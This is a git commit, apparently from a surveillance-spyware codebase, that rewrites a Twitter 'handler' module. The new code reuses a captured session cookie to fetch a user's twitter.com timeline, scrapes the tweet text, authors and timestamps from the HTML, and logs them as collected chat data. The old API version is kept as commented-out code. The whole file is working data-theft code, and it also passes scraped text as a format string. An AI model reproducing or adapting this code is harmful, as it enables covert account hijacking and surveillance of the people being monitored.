bccc222a5ada71862d73c295fa3175c35315e762
naga <naga@hackingteam.it>
2014-10-29 10:15:36 +0100

    Fix for Twitter parsing (only tweets)

--- Social/Handler_Twitter.cpp
+++ Social/Handler_Twitter.cpp
@@ -21,6 +21,18 @@ extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 #define TW_CONTACT_ID1 "\"screen_name\":\""
 #define TW_CONTACT_ID2 "\"name\":\""
 #define TW_ID_LIMIT 95
+
+#define TWITTER_TWEET_START "<p class=\"js-tweet-text tweet-text\""
+#define TWITTER_TWEET_END   "</p>"
+#define TWITTER_TWEET_ID_START "data-tweet-id=\"" //"<a class=\"permalink-link js-permalink js-nav\" href=\""
+#define TWITTER_TWEET_ID_END   "\"" //useless
+#define TWITTER_TWEET_AUTHOR_START "data-screen-name=\""//"<span class=\"username js-action-profile-name\""
+#define TWITTER_TWEET_AUTHOR_END "</span>"//useless
+#define TWITTER_TWEET_DISPLAY_NAME_START "data-name=\""
+#define TWITTER_TWEET_TIMESTAMP_START "data-time=\"" //"<span class=\"_timestamp js-short-timestamp js-relative-timestamp\"  data-time=\""
+#define TWITTER_TWEET_TIMESTAMP_END   "\"" //useless
+
+
 DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
 {
 	DWORD ret_val;
@@ -222,96 +234,248 @@ DWORD ParseTweet(char *user, char *cookie)
 	DWORD response_len;
 	char *parser1, *parser2;
 	WCHAR twitter_request[256];
-	char tweet_body[256];
+	char tweet_body[2048];
 	char tweet_id[256];
 	char tweet_ts[256];
 	char screen_name[256];
+	char tweet_author[256];
+	char tweet_timestamp[256];
 	ULARGE_INTEGER act_tstamp;
 	DWORD last_tstamp_hi, last_tstamp_lo;
 	struct tm tstamp;
 
-	last_tstamp_lo = GetLastFBTstamp(user, &last_tstamp_hi);
+	/*	since the first tweet of this batch will have a higher timestamp, 
+		save it to update social status at the end of the batch  */
+	DWORD dwHigherBatchTimestamp = 0;
 
-	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/statuses/user_timeline.json?user_id=%S", user);
-	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
+	last_tstamp_lo = GetLastFBTstamp(user, &last_tstamp_hi);
+	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);
+
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 
 	parser1 = (char *)r_buffer;
 	
+	/* loop through tweets retrieved from timeline, html structure for a tweet 
+		1] body
+		2] tweet id
+		3] author
+		4] timestamp
+	*/
 	for (;;) {
-		CheckProcessStatus();
-		parser1 = strstr(parser1, TW_TWEET_TS);
-		if (!parser1)
-			break;
-		parser1 += strlen(TW_TWEET_TS);
-		parser2 = strchr(parser1, '\"');
-		if (!parser2)
-			break;
-		*parser2 = NULL;
-		_snprintf_s(tweet_ts, sizeof(tweet_ts), _TRUNCATE, "%s", parser1);
-		parser1 = parser2 + 1;
 
-		parser1 = strstr(parser1, TW_TWEET_ID);
-		if (!parser1)
+		/* 1] tweet body: 
+		   e.g. <p class="js-tweet-text tweet-text" lang="en" data-aria-label-part="0">BODY</p>
+		   a) find start of <p>, and then reach the end of <p>
+		   b) find </p>
+		*/
+		parser1 = strstr(parser1, TWITTER_TWEET_START);
+		if( !parser1 )
 			break;
-		parser1 += strlen(TW_TWEET_ID);
-		parser2 = strchr(parser1, '\"');
-		if (!parser2)
-			break;
-		*parser2 = NULL;
-		_snprintf_s(tweet_id, sizeof(tweet_id), _TRUNCATE, "%s", parser1);
-		parser1 = parser2 + 1;
 
-		if (!atoi(tweet_id))
-			continue;
-		// Verifica se e' gia' stato preso
-		sscanf_s(tweet_id, "%llu", &act_tstamp);
-		if (act_tstamp.HighPart < last_tstamp_hi)
+		parser1 = strchr(parser1, '>');
+		if( !parser1 )
 			break;
-		if (act_tstamp.HighPart==last_tstamp_hi && act_tstamp.LowPart<=last_tstamp_lo)
-			break;
-		SetLastFBTstamp(user, act_tstamp.LowPart, act_tstamp.HighPart);
 
-		parser1 = strstr(parser1, TW_TWEET_BODY);
-		if (!parser1)
+		parser1 += 1;
+		parser2 = strstr(parser1, TWITTER_TWEET_END);
+
+		if( !parser2 )
 			break;
-		parser1 += strlen(TW_TWEET_BODY);
-		parser2 = strchr(parser1, '\"');
-		if (!parser2)
-			break;
+
 		*parser2 = NULL;
 		_snprintf_s(tweet_body, sizeof(tweet_body), _TRUNCATE, "%s", parser1);
 		parser1 = parser2 + 1;
 
-		parser1 = strstr(parser1, TW_CONTACT_ID1);
-		if (!parser1)
+		/* 2] tweet id
+			e.g. data-tweet-id="526625177615220736"
+		*/
+		parser1 = strstr(parser1, TWITTER_TWEET_ID_START);
+		if( !parser1 )
 			break;
-		parser1 += strlen(TW_CONTACT_ID1);
-		parser2 = strchr(parser1, '\"');
-		if (!parser2)
+		
+		parser1 += strlen(TWITTER_TWEET_ID_START);
+		parser2 = strchr(parser1, '"');
+
+		if( !parser2 )
 			break;
+
 		*parser2 = NULL;
-		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
+		_snprintf_s(tweet_id, sizeof(tweet_id), _TRUNCATE, parser1);
 		parser1 = parser2 + 1;
 
-		// XXX Sistemare il timestamp
-		GET_TIME(tstamp);
+		/* 3] tweet author and display name
+			e.g. data-screen-name="TheEconomist" data-name="The Economist" data-user-id="5988062"
+		*/
+		parser1 = strstr(parser1, TWITTER_TWEET_AUTHOR_START);
+		if( !parser1 )
+			break;
+
+		parser1 += strlen(TWITTER_TWEET_AUTHOR_START);
+		parser2 = strchr(parser1, '"');
+
+		if( !parser2 )
+			break;
+
+		*parser2 = NULL;
+		_snprintf_s(tweet_author, sizeof(tweet_author), _TRUNCATE, parser1);
+		parser1 = parser2 + 1;
+
+		parser1 = strstr(parser1, TWITTER_TWEET_DISPLAY_NAME_START);
+		if( !parser1 )
+			break;
+
+		parser1 += strlen(TWITTER_TWEET_DISPLAY_NAME_START);
+		parser2 = strchr(parser1, '"');
+
+		if( !parser2 )
+			break;
+
+		*parser2 = NULL;
+		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, parser1);
+		parser1 = parser2 + 1;
+
+		/* 4] timestamp
+			e.g.  data-time="1414392201"
+		*/
+		parser1 = strstr(parser1, TWITTER_TWEET_TIMESTAMP_START);
+		if( !parser1 )
+			break;
+
+		parser1 += strlen(TWITTER_TWEET_TIMESTAMP_START);
+		parser2 = strchr(parser1, '"');
+
+		if( !parser2 )
+			break;
+
+		*parser2 = NULL;
+		_snprintf_s(tweet_timestamp, sizeof(tweet_timestamp), _TRUNCATE, parser1);
+		parser1 = parser2 + 1;
+
+		/* if the tweet is new save it , discard otherwise */
+		if (!atoi(tweet_timestamp))
+			continue;
+		
+		sscanf_s(tweet_timestamp, "%llu", &act_tstamp);
+		
+		if( act_tstamp.LowPart > 2000000000 || act_tstamp.LowPart <= last_tstamp_lo)
+			continue;
+
+		/* should hold true only for the first tweet in the batch */
+		if( act_tstamp.LowPart > dwHigherBatchTimestamp )
+			dwHigherBatchTimestamp = act_tstamp.LowPart; 
+
+		errno_t er = gmtime_s(&tstamp, (time_t *) &act_tstamp);
 		LogSocialIMMessageA(CHAT_PROGRAM_TWITTER, "", "", screen_name, "", tweet_body, &tstamp, FALSE); 	
-
-		parser1 = strstr(parser1, TW_TWEET_TS);
-		if (!parser1)
-			break;
-		parser1 += strlen(TW_TWEET_TS);
-		parser2 = strchr(parser1, '\"');
-		if (!parser2)
-			break;
-		parser1 = parser2 + 1;
 	}
+
+	SetLastFBTstamp(user, dwHigherBatchTimestamp, 0);
 
 	SAFE_FREE(r_buffer);
 	return SOCIAL_REQUEST_SUCCESS;
 }
+
+
+//#define TW_TWEET_BODY "\"text\":\""
+//#define TW_TWEET_ID "\"id_str\":\""
+//#define TW_TWEET_TS "\"created_at\":\""
+//DWORD ParseTweet(char *user, char *cookie)
+//{
+//	DWORD ret_val;
+//	BYTE *r_buffer = NULL;
+//	DWORD response_len;
+//	char *parser1, *parser2;
+//	WCHAR twitter_request[256];
+//	char tweet_body[256];
+//	char tweet_id[256];
+//	char tweet_ts[256];
+//	char screen_name[256];
+//	ULARGE_INTEGER act_tstamp;
+//	DWORD last_tstamp_hi, last_tstamp_lo;
+//	struct tm tstamp;
+//
+//	last_tstamp_lo = GetLastFBTstamp(user, &last_tstamp_hi);
+//
+//	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/statuses/user_timeline.json?user_id=%S", user);
+//	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
+//	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+//		return ret_val;
+//
+//	parser1 = (char *)r_buffer;
+//	
+//	for (;;) {
+//		CheckProcessStatus();
+//		parser1 = strstr(parser1, TW_TWEET_TS);
+//		if (!parser1)
+//			break;
+//		parser1 += strlen(TW_TWEET_TS);
+//		parser2 = strchr(parser1, '\"');
+//		if (!parser2)
+//			break;
+//		*parser2 = NULL;
+//		_snprintf_s(tweet_ts, sizeof(tweet_ts), _TRUNCATE, "%s", parser1);
+//		parser1 = parser2 + 1;
+//
+//		parser1 = strstr(parser1, TW_TWEET_ID);
+//		if (!parser1)
+//			break;
+//		parser1 += strlen(TW_TWEET_ID);
+//		parser2 = strchr(parser1, '\"');
+//		if (!parser2)
+//			break;
+//		*parser2 = NULL;
+//		_snprintf_s(tweet_id, sizeof(tweet_id), _TRUNCATE, "%s", parser1);
+//		parser1 = parser2 + 1;
+//
+//		if (!atoi(tweet_id))
+//			continue;
+//		// Verifica se e' gia' stato preso
+//		sscanf_s(tweet_id, "%llu", &act_tstamp);
+//		if (act_tstamp.HighPart < last_tstamp_hi)
+//			break;
+//		if (act_tstamp.HighPart==last_tstamp_hi && act_tstamp.LowPart<=last_tstamp_lo)
+//			break;
+//		SetLastFBTstamp(user, act_tstamp.LowPart, act_tstamp.HighPart);
+//
+//		parser1 = strstr(parser1, TW_TWEET_BODY);
+//		if (!parser1)
+//			break;
+//		parser1 += strlen(TW_TWEET_BODY);
+//		parser2 = strchr(parser1, '\"');
+//		if (!parser2)
+//			break;
+//		*parser2 = NULL;
+//		_snprintf_s(tweet_body, sizeof(tweet_body), _TRUNCATE, "%s", parser1);
+//		parser1 = parser2 + 1;
+//
+//		parser1 = strstr(parser1, TW_CONTACT_ID1);
+//		if (!parser1)
+//			break;
+//		parser1 += strlen(TW_CONTACT_ID1);
+//		parser2 = strchr(parser1, '\"');
+//		if (!parser2)
+//			break;
+//		*parser2 = NULL;
+//		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
+//		parser1 = parser2 + 1;
+//
+//		// XXX Sistemare il timestamp
+//		GET_TIME(tstamp);
+//		LogSocialIMMessageA(CHAT_PROGRAM_TWITTER, "", "", screen_name, "", tweet_body, &tstamp, FALSE); 	
+//
+//		parser1 = strstr(parser1, TW_TWEET_TS);
+//		if (!parser1)
+//			break;
+//		parser1 += strlen(TW_TWEET_TS);
+//		parser2 = strchr(parser1, '\"');
+//		if (!parser2)
+//			break;
+//		parser1 = parser2 + 1;
+//	}
+//
+//	SAFE_FREE(r_buffer);
+//	return SOCIAL_REQUEST_SUCCESS;
+//}
 
 DWORD HandleTwitterTweets(char *cookie)
 {
